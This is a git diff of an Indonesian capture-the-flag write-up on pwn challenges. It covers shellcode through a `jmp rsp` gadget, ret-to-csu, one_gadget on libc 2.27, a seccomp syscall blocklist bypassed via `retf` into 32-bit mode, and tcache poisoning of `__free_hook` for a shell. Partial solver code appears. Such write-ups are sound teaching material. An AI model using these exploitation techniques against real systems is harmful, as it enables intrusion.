@@ -13,7 +13,7 @@ Tulisan ini akan menjadi sebuah *remainder* perjalanan saya *mungkin* selama set
 
 ## Stacked [489 pts]
 
-Use `jmp rsp` gadged to return in our shellcode.
+Use `jmp rsp` gadget to return in our shellcode.
 
 ### Overview
 
@@ -112,7 +112,7 @@ Terdapat fungsi yang menarik disini, yaitu pada fungsi *useful*. Seperti namanya
 
 Karena stack executable, bisa return ke shellcode kita dengan gadget diatas.
 
-Oiya, karena interaksi dilakukan tidak langsung pada binarynya *child atau apalah ngga tau istilahnya*, jika inject shellcode *execve* secara langsung, maka stdin, stdout akan masuk *parent*-nya.
+Oiya, karena interaksi dilakukan tidak langsung pada binarynya *(apalah ngga tau istilahnya)*, jika inject shellcode *execve* secara langsung, maka stdin, stdout akan masuk *parent*. Sementara, kita berada pada posisi yang berinteraksi dengan parent.
 
 Solusi? *socketcall* syscall. Full solver.
 
@@ -142,7 +142,6 @@ def exploit(r):
     p += asm(shellcraft.sh())
     
     r.sendlineafter("> ", p)
-
     r.interactive()
 
 if __name__ == '__main__':
@@ -199,7 +198,7 @@ Ini binary 64bit. Parameter fungsi secara berurutan terletak di rdi, rsi, rdx, r
 
 Nah, gadget untuk mengeset rdi, rsi, dkk dalam binary ini tidak ditemukan. Sementara untuk melakukan leak dengan fungsi *write*, diperlukan 3 parameter (rdi, rsi, rdx). 
 
-Solusi? yaa.. *ret-to-csu*. Kembali ke-*main* lagi untuk melakukan rop yang ke-dua.
+Solusi? yaa.. *ret-to-csu*. Lalu kembali lagi ke-*main* untuk melakukan rop yang ke-dua.
 
 Full solver,
 
@@ -216,7 +215,6 @@ libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', 0)
 gdbscript = '''
     b *0x00000000004011B5
 '''
-
 
 def debug(gdbscript):
     if type(r) == process:
@@ -350,7 +348,7 @@ Seperti yang saya katakan diatas. Libc leak dapat didapatkan dengan xor saved_ca
 
 Karena overflow hanya 24 byte, dan 16 byte untuk canary dan padding. Jadi untuk rop sendiri itu hanya 8 byte. Jadi, ret-to-libc dengan system disini tidak bisa dilakukan. Karena harus set parameter dulu yang butuh minimal 24 bytes.
 
-Nah, karena versi libc yang dipakai server itu 2.27. Spray one_gadget disini bisa dilakukan. FYI, semenjak saya masuk di libc.2.31, one_gadget hook tidak bisa dilakukan :'(.
+Nah, karena versi libc yang dipakai server itu 2.27. Spray one_gadget disini bisa dilakukan. FYI, semenjak saya *masuk* di libc 2.31, one_gadget hook tidak bisa dilakukan :'(.
 
 Full solver,
 
@@ -433,34 +431,34 @@ I set up a secure environment for users to execute shellcode. Now nobody will be
 Blacklist syscall numbers.
 
 ```py
-    line  CODE  JT   JF      K
-    =================================
-    0000: 0x20 0x00 0x00 0x00000004  A = arch
-    0001: 0x20 0x00 0x00 0x00000000  A = sys_number
-    0002: 0x25 0x0c 0x00 0x3fffffff  if (A > 0x3fffffff) goto 0015
-    0003: 0x15 0x0b 0x00 0x00000059  if (A == readlink) goto 0015
-    0004: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0015
-    0005: 0x15 0x09 0x00 0x00000038  if (A == clone) goto 0015
-    0006: 0x15 0x08 0x00 0x00000039  if (A == fork) goto 0015
-    0007: 0x15 0x07 0x00 0x0000003a  if (A == vfork) goto 0015
-    0008: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0015
-    0009: 0x15 0x05 0x00 0x00000055  if (A == creat) goto 0015
-    0010: 0x15 0x04 0x00 0x00000101  if (A == openat) goto 0015
-    0011: 0x15 0x03 0x00 0x00000142  if (A == execveat) goto 0015
-    0012: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0015
-    0013: 0x15 0x01 0x00 0x00000011  if (A == pread64) goto 0015
-    0014: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0016
-    0015: 0x06 0x00 0x00 0x00000000  return KILL
-    0016: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+line  CODE  JT   JF      K
+=================================
+0000: 0x20 0x00 0x00 0x00000004  A = arch
+0001: 0x20 0x00 0x00 0x00000000  A = sys_number
+0002: 0x25 0x0c 0x00 0x3fffffff  if (A > 0x3fffffff) goto 0015
+0003: 0x15 0x0b 0x00 0x00000059  if (A == readlink) goto 0015
+0004: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0015
+0005: 0x15 0x09 0x00 0x00000038  if (A == clone) goto 0015
+0006: 0x15 0x08 0x00 0x00000039  if (A == fork) goto 0015
+0007: 0x15 0x07 0x00 0x0000003a  if (A == vfork) goto 0015
+0008: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0015
+0009: 0x15 0x05 0x00 0x00000055  if (A == creat) goto 0015
+0010: 0x15 0x04 0x00 0x00000101  if (A == openat) goto 0015
+0011: 0x15 0x03 0x00 0x00000142  if (A == execveat) goto 0015
+0012: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0015
+0013: 0x15 0x01 0x00 0x00000011  if (A == pread64) goto 0015
+0014: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0016
+0015: 0x06 0x00 0x00 0x00000000  return KILL
+0016: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 ```
 
 Tidak bisa inject shellcode execve, execveat, karena di blacklist. open-read-write juga diblacklist. Syscall ABI? tidak bisa yang di-*allow* hanya kurang dari 0x3fffffff.
 
-Solusi? yeah. `retf intruction`.
+Ada intruksi yang bernama "far return" atau lebih dikenalnya dengan `retf`. Intruksi ini akan *pop* 2 value, yaitu di *cs* dan *ip*. Jika value *cs* ini 0x23, maka program akan return ke "32 bit mode". Kalau cs ini 0x33, program return ke "64 bit mode". Nah dengan ini, kita bisa return ke 32 bit mode.
 
-Intruksi ini akan pop 2 value, yaitu di *cs* dan *ip*. Jika value *cs* ini 0x23, maka program akan return ke "32 bit mode". Kalau cs init 0x33, program return ke "64 bit mode".
+Ini cukup mem-*bypass* filter-filter diatas. Karena *syscall_number* di 32 bit itu berbeda dengan 64 bit. Tapi execve di 32 bit tidak bisa dilakukan, karena ter-blacklist juga.
 
-Nah ini cukup mem-*bypass* filter diatas. Karena *syscall_number* di 32 bit itu beda sama 64 bit. Tapi execve tidak bisa dilakukan, karena ter-blacklist juga.
+Full solver,
 
 ```python
 #!/usr/bin/python
@@ -516,10 +514,9 @@ response  = upload_file(shellcode)
 flag = re.search("flag{.*}", response).group()
 
 print flag
-
 ```
 
-Didalam *Dockerfile* didapatkan letak flag yaitu di "/flag.txt". Tinggal *open-read-write* file "/flag.txt". Udah.
+Didalam *Dockerfile* didapatkan letak flag yaitu di "/flag.txt". Tinggal *open-read-write* file flag. Udah.
 
 
 ### Flag
@@ -644,7 +641,7 @@ Melakukan *free* terhadap data yang terakhir kali dialokasikan.
 
 ### Bug
 
-Ya, bug-nya terdapat di edit dan print. Disana tidak ada pengecekan bahwa data sudah di free atau belum. Ini menimbulkan *use-after-free*. Tapi *use-after-free* disini terhadap index yang terakhir di-free.
+Ya, bug-nya terdapat di edit dan print. Disana tidak ada pengecekan bahwa data sudah di free atau belum. Ini menimbulkan bug *use-after-free*. Tapi *use-after-free* disini terhadap index yang terakhir di-free.
 
 ```
 $ ./waf 
@@ -710,14 +707,14 @@ Last config removed.
 > 3
 What is the index of the config to print?: 0
 
-ID: 4215472    <- LEAK
-Setting:     <- LEAK
+ID: 4215472     <- LEAK
+Setting: \x90!£ <- LEAK
 Is active: 0
 ```
 
 ### Information Leak.
 
-Leak bisa didapatkan dengan memenuhi *tcache-bin*. Yaitu dengan alloc 7 chunks, lalu free semuanya. Nah chunk terakhir ini akan berisi sisa-sisa pointer *unsorted-bin* yang berisi alamat *main_arena*. Nah karena *main_arena* itu letaknya di-libc, maka dengan *use-after-free* yaitu dengan print index ini akan mendapatkan libc leak!
+Leak bisa didapatkan dengan memenuhi *tcache-bin*. Yaitu dengan alloc 8 chunks, lalu free semuanya. 7 chunk akan memenuhi tcache. Lalu chunk terakhir yang telah difree ini akan terletak di *unsorted-bin* dan berisi alamat *main_arena*. Nah karena *main_arena* itu letaknya di-libc, maka dengan use-after-free yaitu dengan print index ini akan mendapatkan libc leak!
 
 Setelah itu, tinggal *tcache poisoning*. Overwrite `__free_hook` dengan `system`. Free chunk yang menyimpan string "/bin/sh" untuk mendapatkan RCE.
 
